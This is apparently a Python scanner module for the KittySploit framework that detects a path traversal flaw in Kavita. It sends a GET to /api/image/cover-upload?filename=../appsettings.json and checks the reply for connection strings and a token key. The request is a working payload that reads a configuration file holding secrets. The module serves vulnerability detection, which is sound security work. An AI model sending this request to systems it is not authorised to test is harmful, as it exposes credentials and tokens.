#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename paramete."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kavita - Local File Inclusion Detection',
        'description': 'Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'kavita', 'lfi', 'huntr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/image/cover-upload?filename=../appsettings.json', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"ConnectionStrings":', '"Path":', '"TokenKey":',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Kavita - Local File Inclusion detected",
                path='/api/image/cover-upload?filename=../appsettings.json',
            )
            return True
        return False

